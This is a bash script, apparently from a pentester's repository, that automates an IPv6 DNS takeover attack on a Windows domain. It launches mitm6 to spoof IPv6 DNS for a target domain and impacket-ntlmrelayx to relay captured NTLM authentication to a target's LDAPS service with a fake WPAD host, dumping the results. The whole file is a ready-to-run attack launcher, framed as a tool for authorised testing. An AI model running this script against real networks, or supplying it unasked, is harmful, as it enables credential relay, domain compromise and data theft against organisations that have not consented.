#!/bin/bash

# ===============================================================
# hexahavoc.sh - IPv6 DNS Takeover Automation Script
# ---------------------------------------------------------------
# This script automates the setup of an IPv6 DNS takeover attack 
# using mitm6 and impacket-ntlmrelayx, leveraging tmux to manage 
# the session. Designed for network administrators and pentesters
# to identify potential vulnerabilities in IPv6 DNS handling.
#
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# ===============================================================

# Define color variables
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"

# Check if a command exists
check_command() {
  if ! command -v "$1" &> /dev/null; then
    echo -e "${RED}Error: $1 is not installed. Please install it before running this script.${RESET}"
    exit 1
  fi
}

# Print usage information
usage() {
  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v]${RESET}"
  echo -e "${YELLOW}Options:${RESET}"
  echo -e "  -d  Specify the target domain"
  echo -e "  -t  Specify the target IP"
  echo -e "  -i  Specify the network interface (default: eth0)"
  echo -e "  -v  Enable verbose logging"
  exit 1
}

# Check if tmux is installed
check_command "tmux"

# Initialize variables with default values
target_domain=""
target_ip=""
interface="eth0"
verbose=0

# Parse command-line arguments
while getopts ":d:t:i:v" opt; do
  case "$opt" in
    d) target_domain="$OPTARG" ;;
    t) target_ip="$OPTARG" ;;
    i) interface="$OPTARG" ;;
    v) verbose=1 ;;
    \?) usage ;;
  esac
done

# Ensure required arguments are provided
if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
  echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
  usage
fi

# Check dependencies
echo -e "${CYAN}Checking dependencies...${RESET}"
check_command "mitm6"
check_command "impacket-ntlmrelayx"

# Enable verbose logging if requested
if [ "$verbose" -eq 1 ]; then
  echo -e "${YELLOW}Enabling verbose mode...${RESET}"
  set -x
fi

# Check if the tmux session already exists
echo -e "${CYAN}Checking if the tmux session 'ipv6_dns_takeover' already exists...${RESET}"
if tmux has-session -t ipv6_dns_takeover 2>/dev/null; then
  echo -e "${GREEN}Session exists. Attaching...${RESET}"
  tmux -CC attach-session -t ipv6_dns_takeover
  exit 0
fi

# Create a new tmux session
echo -e "${CYAN}Creating a new tmux session named 'ipv6_dns_takeover'...${RESET}"
tmux new-session -d -s ipv6_dns_takeover

# Create the first window for mitm6
echo -e "${CYAN}Starting mitm6 in the tmux session...${RESET}"
tmux send-keys -t ipv6_dns_takeover:0.0 "mitm6 -i $interface -d $target_domain" C-m
tmux rename-window -t ipv6_dns_takeover:0 'mitm6'

# Create the second window for impacket-ntlmrelayx
echo -e "${CYAN}Starting impacket-ntlmrelayx in the tmux session...${RESET}"
tmux new-window -t ipv6_dns_takeover:1 -n 'impacket-ntlmrelayx'
tmux send-keys -t ipv6_dns_takeover:1 "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh VCwpad.$target_domain -l dumps" C-m

# Attach to the tmux session
echo -e "${GREEN}Attaching to the tmux session 'ipv6_dns_takeover'...${RESET}"
tmux -CC attach-session -t ipv6_dns_takeover

# Disable verbose logging
if [ "$verbose" -eq 1 ]; then
  echo -e "${YELLOW}Disabling verbose mode...${RESET}"
  set +x
fi
